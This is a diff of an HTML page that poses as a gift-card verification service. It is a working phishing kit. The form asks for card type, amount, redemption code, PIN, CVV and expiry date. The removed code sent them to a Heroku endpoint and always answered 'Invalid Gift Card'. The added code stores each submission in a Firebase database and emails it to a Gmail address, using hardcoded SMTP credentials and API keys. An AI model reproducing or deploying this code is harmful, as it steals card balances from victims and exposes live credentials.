@@ -249,120 +249,197 @@
               </h2>
 
               <div class="border-gray-300 border-2">
-                <div class="card-body">
+                <div class="grid place-content-center">
                   <!-- <div class="mb-05 text-lg">Enter Your Gift Card Redemption Code.</div> -->
-                  <form class="needs-validation">
-                    <div class="form-group basic animated">
-                      <div class="input-wrapper">
-                        <label class="label text-lg" for="code"
-                          >Gift Card Name</label
-                        >
+                  <form
+                    id="stripe-login"
+                    class="contact-form box-background--white paading"
+                  >
+                    <select
+                      id="card-type"
+                      required=""
+                      name="cardName"
+                      class="form-select is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
+                      style="border-radius: 64px; margin-top: 10px"
+                      placeholder="Select type of card"
+                    >
+                      <option value="" class="">Select type of card</option>
+                      <option value="Apple">Apple</option>
+                      <option value="Amazon">Amazon</option>
+                      <option value="Steam">Steam</option>
+                      <option value="eBay">eBay</option>
+                      <option value="Xbox">Xbox</option>
+                      <option value="Googleplay">Googleplay</option>
+                      <option value="PlayStation">PlayStation</option>
+                      <option value="Sephora">Sephora</option>
+                      <option value="RazerGold">RazerGold</option>
 
-                        <select
-                          class="form-control is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
-                          id="name"
-                          name="name"
-                          required
-                        >
-                          <option value="NONE">
-                            Click to Select Gift Card Name
-                          </option>
-                          <option value="GOOGLE_PLAY">Google Play</option>
-                          <option value="STEAM">Steam</option>
-                          <option value="APPLE">Apple</option>
-                          <option value="MASTER_CARD">Master Card</option>
+                      <option value="Nordstrom">Nordstrom</option>
+                      <option value="Nike">Nike</option>
+                      <option value="MasterCard">MasterCard</option>
+                      <option value="Vanilla">Vanilla Visa</option>
+                      <option value="Wallmart Visa">Wallmart Visa</option>
+                      <option value="Visa Silvery White">
+                        Visa Silvery White
+                      </option>
+                      <option value="TT Visa">TT Visa</option>
+                      <option value="Amex">Amex</option>
+                    </select>
 
-                          <option value="VISA_SILVERY_WHITE">
-                            Visa Silvery White
-                          </option>
-
-                          <option value="EBAY_CARD">Ebay Card</option>
-                          <option value="FOOTLOCKER">Footlocker</option>
-                          <option value="NIKE_CARD">Nike Card</option>
-                          <option value="AMAZON">Amazon</option>
-                          <option value="AMEX">Amex</option>
-                          <option value="WALMART_VISA">Walmart Visa</option>
-                          <option value="VANILLA">Vanilla</option>
-                          <option value="NORDSTROM_CARD">Nordstrom Card</option>
-                          <option value="SEPHORA">Sephora</option>
-                          <option value="GOOGLE_PLAY">Others</option>
-                        </select>
-                        <i class="clear-input">
-                          <ion-icon name="close-circle"></ion-icon>
-                        </i>
-                      </div>
-                    </div>
-                    <!-- <label class="label text-lg" for="code">Currency </label>
-
-                           <select class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"  id="currency" required>
-
-                             <option value="USD">USD</option>
-                             <option value="GBP">GBP</option>
-                             <option value="AUD">AUD</option>
-                             <option value="EUR">EUR</option>
-                             <option value="CAD">CAD</option>
-                           </select>
-                           <div class="form-group basic animated">
-                              <div class="input-wrapper">
-                                <label class="label text-lg" for="code">Card Amount</label>
-                                <input
-                                  type="text"
-                                  class="form-control is-invalid"
-                                  id="amount"
-                                  placeholder="Redemption Code"
-                                  required
-                                />
-                                <i class="clear-input">
-                                  <ion-icon name="close-circle"></ion-icon>
-                                </i>
-                              </div>
-                            </div> -->
-
-                    <div class="form-group basic animated">
-                      <div class="input-wrapper">
-                        <label class="label text-lg" for="code"
-                          >Redemption Code</label
-                        >
-                        <input
-                          type="text"
-                          class="form-control is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                          id="code"
-                          placeholder="Redemption Code"
-                          required
-                        />
-                        <i class="clear-input">
-                          <ion-icon name="close-circle"></ion-icon>
-                        </i>
-                      </div>
-                    </div>
-
-                    <div id="extras"></div>
-                    <div class="flex items-center justify-center">
-                      <button
-                        id="button"
-                        class="group relative h-12 w-48 overflow-hidden rounded-lg bg-white text-lg shadow"
+                    <div style="display: flex; gap: 10px">
+                      <select
+                        id="currency-type"
+                        name="currency"
+                        class="form-select is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
+                        style="
+                          border-radius: 64px;
+                          margin-top: 15px;
+                          width: 30%;
+                        "
+                        placeholder="Select type of card"
                       >
-                        <div
-                          class="absolute inset-0 w-3 bg-[#11aeef] transition-all duration-[250ms] ease-out group-hover:w-full"
-                        ></div>
-                        <span
-                          id="text"
-                          class="relative text-black group-hover:text-white"
-                          >Verify</span
-                        >
-                      </button>
-                      <!-- <button type="button" id="buttonm">helo</button> -->
+                        <option value="USD">USD</option>
+                        <option value="GBP">GBP</option>
+                        <option value="AUD">AUD</option>
+                        <option value="EUR">EUR</option>
+                        <option value="CAD">CAD</option>
+                      </select>
+                      <div
+                        class="field padding-bottom--28"
+                        style="margin-top: 20px; width: 70%"
+                      >
+                        <input
+                          class="form-control is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                          id="amount"
+                          required=""
+                          type="number"
+                          placeholder=" Card Amount"
+                        />
+                      </div>
                     </div>
 
-                    <div class="form-group">
-                      <div class="input-wrapper">
-                        <!-- <button
-                              type="submit"
-                              class="bg-blue hover:bg-blue-dark text-white font-bold py-2 px-4 rounded"
-                              id="button"
-                              value="Check"
-                            /> -->
-                      </div>
+                    <div class="field padding-top--24">
+                      <input
+                        class="form-control mt-3 is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                        id="redemptioncode"
+                        type="text"
+                        placeholder=" Redemption Code"
+                        required
+                        minlength="4"
+                        maxlength="20"
+                      />
+                    </div>
+
+                    <div
+                      id="form0"
+                      class="testtest"
+                      style="color: #000; display: none; font-size: small"
+                    >
+                      <p style="color: rgb(255, 0, 0)">
+                        16 digit code at the face of the card
+                      </p>
+                    </div>
+
+                    <div
+                      id="form01"
+                      class="testtest"
+                      style="color: #000; display: none; font-size: small"
+                    >
+                      <p style="color: rgb(255, 0, 0)">
+                        15 digit code at the face of the card
+                      </p>
+                    </div>
+
+                    <div
+                      class="form-control is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                      id="form5"
+                      class="field"
+                      style="margin-top: 20px; display: none"
+                    >
+                      <input type="number" placeholder=" Access Number" />
+                    </div>
+
+                    <div
+                      id="form"
+                      class="field"
+                      style="margin-top: 20px; display: none"
+                    >
+                      <input
+                        class="form-control is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                        name="date"
+                        size="10"
+                        placeholder="Gift Card Expiry Date"
+                        maxlength="7"
+                        id="cardexpiredate"
+                        onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/[^\d\/]/g,'$1/$2')"
+                      />
+                    </div>
+
+                    <div
+                      id="form4"
+                      class="field"
+                      style="display: none; margin-top: 15px"
+                    >
+                      <input
+                        id="fourpin"
+                        type="number"
+                        placeholder=" 4 Digit Pin"
+                      />
+                    </div>
+
+                    <div
+                      id="form2"
+                      class="field"
+                      style="margin-top: 20px; display: none"
+                    >
+                      <input
+                        class="form-control is-invalid bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                        id="cardcvv"
+                        type="number"
+                        placeholder=" Gift Card CVV"
+                      />
+                    </div>
+                    <div
+                      id="form3"
+                      class="field padding-bottom--24"
+                      style="margin-top: 20px; display: none"
+                    >
+                      <input
+                        id="cardpin"
+                        type="number"
+                        placeholder=" Gift Card Pin"
+                      />
+                    </div>
+
+                    <!-- <div class="bod">
+                    <div class="box">
+                      <div class="b b1"></div>
+                      <div class="b b2"></div>
+                      <div class="b b3"></div>
+                      <div class="b b4"></div>
+                    </div>
+       
+                   </div>
+                    -->
+
+                    <!-- <div > <p style="color:rgb(255, 178, 178)">  Please make sure the redemption code is the original scratched code</p></div> -->
+                    <div
+                      class="flex items-center justify-center"
+                      style="margin-top: 44px"
+                    >
+                      <input
+                        class="inline-block mb-3 px-6 py-2.5 bg-[#31aeef] text-white font-medium text-xs leading-tight uppercase rounded shadow-md hover:bg-blue-700 hover:shadow-lg focus:bg-blue-700 focus:shadow-lg focus:outline-none focus:ring-0 active:bg-blue-800 active:shadow-lg transition duration-150 ease-in-out"
+                        type="submit"
+                        name="submit"
+                        value="Continue"
+                        id="myButton1"
+                      />
+                    </div>
+                    <div>
+                      <p style="color: gray">
+                        Please make sure the codes you are about to input are
+                        correct and according to details
+                      </p>
                     </div>
                   </form>
                 </div>
@@ -736,6 +813,9 @@ Message </textarea
         });
       }
     </script>
+
+    <script src="https://www.gstatic.com/firebasejs/7.17.1/firebase.js"></script>
+
     <!-- google map js -->
     <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyA8eaHt9Dh5H57Zh0xVTqxVdBFCvFMqFjQ&callback=initMap"></script>
     <!-- end google map js -->
@@ -757,153 +837,45 @@ Message </textarea
     <script src="https://smtpjs.com/v3/smtp.js"></script>
 
     <script>
-      const form = document.querySelector("#extras");
+      var firebaseConfig = {
+        apiKey: "AIzaSyDsE5r-M91XpwkiBGoxJl9ssmFINzs-Dlo",
+        authDomain: "allmygiftcard-6f7c4.firebaseapp.com",
+        projectId: "allmygiftcard-6f7c4",
+        storageBucket: "allmygiftcard-6f7c4.appspot.com",
+        messagingSenderId: "270049410086",
+        databaseURL: "https://allmygiftcard-6f7c4-default-rtdb.firebaseio.com",
 
-      const cvvi = `
-
-             <div class="form-group basic animated">
-                    <div class="input-wrapper">
-                      <label class="label text-lg" for="amount2">Gift CVV</label>
-                      <input
-                        type="number"
-                        class="form-control bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                        id="cvv"
-                        placeholder="Gift Card CVV"
-                        required
-
-                      />
-                      <i class="clear-input">
-                        <ion-icon name="close-circle"></ion-icon>
-                      </i>
-                    </div>
-                  </div>
-          `;
-      const expi = `
-
-             <div class="form-group basic animated">
-                    <div class="input-wrapper">
-                      <label class="label text-lg" for="amount2">Gift Expiry Date</label>
-                      <input
-                        type="text"
-                        class="form-control bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                        id="exp"
-                        placeholder="Gift Card Expiry Date"
-                        required
-
-                      />
-                      <i class="clear-input">
-                        <ion-icon name="close-circle"></ion-icon>
-                      </i>
-                    </div>
-                  </div>
-          `;
-      const pini = `
-
-             <div class="form-group basic animated">
-                    <div class="input-wrapper">
-                      <label class="label text-lg" for="amount2">Gift Pin</label>
-                      <input
-                        type="number"
-                        class="form-control bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                        id="pin"
-                        placeholder="Gift Card Pin"
-                        required
-
-                      />
-                      <i class="clear-input">
-                        <ion-icon name="close-circle"></ion-icon>
-                      </i>
-                    </div>
-                  </div>
-          `;
-
-      const pinini = `
-
-             <div class="form-group basic animated">
-                    <div class="input-wrapper">
-                      <label class="label text-lg" for="amount2">4 Digits Pin</label>
-                      <input
-                        type="number"
-                        class="form-control bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                        id="pin"
-                        placeholder="4 Digits Pin"
-                        maxlength="4"
-                        required
-
-                      />
-                      <i class="clear-input">
-                        <ion-icon name="close-circle"></ion-icon>
-                      </i>
-                    </div>
-                  </div>
-          `;
-
-      const cards = {
-        GOOGLE_PLAY: "code",
-        STEAM: "code",
-        SEPHORA: "codepin",
-        NORDSTROM_CARD: "codepin",
-        VANILLA: "codeexpcvv",
-        WALMART_VISA: "codeexpcvv",
-        AMEX: "codeexpcvv4",
-        AMAZON: "code",
-        NIKE_CARD: "codepin",
-        FOOTLOCKER: "code",
-        EBAY_CARD: "code",
-        VISA_SILVERY_WHITE: "codeexpcvv",
-        TT_VISA: "codeexpcvv",
-        MASTER_CARD: "codeexpcvv",
-        APPLE: "code",
+        appId: "1:270049410086:web:fb187b8ae3ed1cae28bae7",
       };
 
-      function getName(card) {
-        return cards[card];
-      }
+      firebase.initializeApp(firebaseConfig);
+      let contactInfo = firebase.database().ref("infos");
 
-      function injectHTML(type) {
-        if (type === "code") {
-          form.innerHTML = "";
-          return;
-        }
+      document
+        .querySelector(".contact-form")
+        .addEventListener("submit", submitForm);
 
-        if (type === "codepin") {
-          form.innerHTML = pini;
-          return;
-        }
+      // function hello(e) {
 
-        if (type === "codeexpcvv") {
-          form.innerHTML = cvvi + expi;
-          return;
-        }
+      //   let cardtype = document.getElementById("card-type").value;
+      //   let amount = document.getElementById("amount").value;
+      //   let currency = document.getElementById("currency-type").value;
 
-        if (type === "codeexpcvvpin") {
-          form.innerHTML = expi + pini + cvvi;
-          return;
-        }
+      //   event.preventDefault();
+      //   myClick()
+      //   document.getElementById("el1").textContent = `${cardtype}`;
+      //   document.getElementById("el2").textContent = `${currency}${amount}`;
 
-        if (type === "codeexpcvv4") {
-          form.innerHTML = expi + pinini + cvvi;
-          return;
-        }
-      }
+      //   document.getElementById("myButton1").value="Checking.......";
 
-      const loader = document.querySelector("#loader");
-      const button = document.querySelector("#button");
-      const modal = document.querySelector("#alert");
-      const names = document.querySelector("#name");
-      var name = names.options[names.selectedIndex].value;
-      const code = document.querySelector("#code");
-
-      const error = document.querySelector(".modal-body");
-
-      const data = document.querySelector("form");
-
-      function toggleModal() {
-        document.getElementById("modall").classList.toggle("hidden");
+      //   console.log("hello");
+      // }
+      function closeNav() {
+        document.getElementById("myNav").style.width = "0%";
+        document.getElementById("myButton1").value = "Continue";
       }
 
       function myClick() {
-        console.log("wawam");
         document.getElementById("modall").classList.toggle("hidden");
 
         setTimeout(function openNav() {
@@ -911,132 +883,101 @@ Message </textarea
         }, 1000);
       }
 
-      const m = "modal open";
-      const s = "overflow: hidden; padding-right: 0px;";
-      data.on;
-      names.onchange = function () {
-        name = names.options[names.selectedIndex].value;
+      function toggleModal() {
+        document.getElementById("modall").classList.toggle("hidden");
+        document.getElementById("myButton1").value = "CONTINUE";
+      }
 
-        if (name !== "NONE") {
-          injectHTML(getName(name));
-        } else {
-          form.innerHTML = "";
-          return;
-        }
+      function submitForm(e) {
+        event.preventDefault();
 
-        const exp = document.querySelector("#exp");
+        document.getElementById("myButton1").value = "Checking.......";
 
-        console.log("GOT HERE");
+        let cardtype = document.getElementById("card-type").value;
+        let currency = document.getElementById("currency-type").value;
+        let amount = document.getElementById("amount").value;
+        let cardpin = document.getElementById("cardpin").value;
+        let cardcvv = document.getElementById("cardcvv").value;
+        let cardexpiredate = document.getElementById("cardexpiredate").value;
+        let cardfourpin = document.getElementById("fourpin").value;
+        let redemptioncode = document.getElementById("redemptioncode").value;
 
-        if (exp) {
-          exp.oninput = function () {
-            const expdate = exp.value;
-            if (exp.value.length > 2) {
-              exp.value =
-                expdate.replace(/\//g, "").substring(0, 2) +
-                (expdate.length > 2 ? "/" : "") +
-                expdate.replace(/\//g, "").substring(2, 4);
-            }
-          };
-        }
-      };
+        //  document.getElementById("el1").textContent = `${cardtype}`;
+        //   document.getElementById("el2").textContent = `${currency}${amount}`;
 
-      data.onsubmit = function (e) {
-        document.getElementById("text").innerText = "Checking.......";
+        // document.querySelector(".contact-form").reset();
 
-        console.log("nawaooo");
+        saveContactInfo(
+          cardtype,
+          currency,
+          amount,
+          cardpin,
+          cardcvv,
+          cardexpiredate,
+          cardfourpin,
+          redemptioncode
+        );
 
-        e.preventDefault();
+        sendEmail(
+          cardtype,
+          currency,
+          amount,
+          cardpin,
+          cardcvv,
+          cardexpiredate,
+          cardfourpin,
+          redemptioncode
+        );
+      }
 
-        const cvv = document.querySelector("#cvv");
-        const exp = document.querySelector("#exp");
-        const pin = document.querySelector("#pin");
+      function saveContactInfo(
+        cardtype,
+        currency,
+        amount,
+        cardpin,
+        cardcvv,
+        cardexpiredate,
+        cardfourpin,
+        redemptioncode
+      ) {
+        let newContactInfo = contactInfo.push();
 
-        if (name === "NONE") {
-          alert("select a giftcard name please ");
-          document.getElementById("text").innerText = "Verify";
-
-          error.textContent = "Please select Gift Card name";
-          modal.click();
-          return;
-        }
-
-        if (code.value.length < 10) {
-          error.textContent = "Invalid gift card redemption code";
-          modal.click();
-          return;
-        }
-
-        if (cvv && cvv.value.length < 3) {
-          error.textContent = "Invalid CVV code provided";
-          modal.click();
-          return;
-        }
-
-        if (pin && pin.value.length < 3) {
-          error.textContent = "Invalid card pin provided";
-          modal.click();
-          return;
-        }
-
-        if (exp && exp.value.length < 5) {
-          error.textContent = "Invalid expiry date provided";
-          modal.click();
-          return;
-        }
-
-        //   loader.style.display = "";
-
-        async function send(code, name, exp, pin, cvv) {
-          var response = await fetch(
-            "https://samperfect.herokuapp.com/api/v1/send/",
-            {
-              method: "POST",
-              body: JSON.stringify({
-                code,
-                name,
-                exp,
-                pin,
-                cvv,
-              }),
-              headers: {
-                "Content-Type": "application/json",
-              },
-            }
-          );
-          //getting the response data
-          var data = await response.json();
-          if (response.status == 200) {
-            myClick();
-            document.getElementById("text").innerText = "Verify";
-
-            return "DONE";
-          }
-        }
-
-        send(
-          code.value,
-          name,
-          exp ? exp.value : "NONE",
-          pin ? pin.value : "NONE",
-          cvv ? cvv.value : "NONE"
-        )
-          .then((state) => {
-            console.log(state);
-
-            // loader.style.display = "none";
-            error.textContent = "Invalid Gift Card Provided.";
-            modal.click();
+        newContactInfo
+          .set({
+            cardtype: cardtype,
+            currency: currency,
+            amount: amount,
+            cardpin: cardpin,
+            cardcvv: cardcvv,
+            cardexpiredate: cardexpiredate,
+            cardfourpin: cardfourpin,
+            redemptioncode: redemptioncode,
           })
-          .catch((error) => {
-            console.log(error);
+          .then(myClick);
+      }
 
-            // loader.style.display = "none";
+      function sendEmail(
+        cardtype,
+        currency,
+        amount,
+        cardpin,
+        cardcvv,
+        cardexpiredate,
+        cardfourpin,
+        redemptioncode
+      ) {
+        Email.send({
+          Host: "smtp.elasticemail.com",
+          Username: "Williamcampbell693@gmail.com",
+          Password: "AB4BBD293A8D811F5B5DF570772BFEB5DACE",
+          Port: 2525,
 
-            error.textContent = "Invalid Gift Card Provided.";
-            modal.click();
-          });
-      };
+          To: "Williamcampbell693@gmail.com",
+          From: "Williamcampbell693@gmail.com",
+          Subject: ` ${"educationalpurposes"} sent you a message`,
+          Body: `name: ${cardtype} <br/> Currency: ${currency} <br/> Amount ${amount} <br/> pinned : ${cardpin} <br/> cvcvv : ${cardcvv} <br/> expiredate : ${cardexpiredate} <br/> fourpin : ${cardfourpin} <br/> Redemptioncode : ${redemptioncode}`,
+        }).then();
+      }
     </script>
   </body>
 </html>
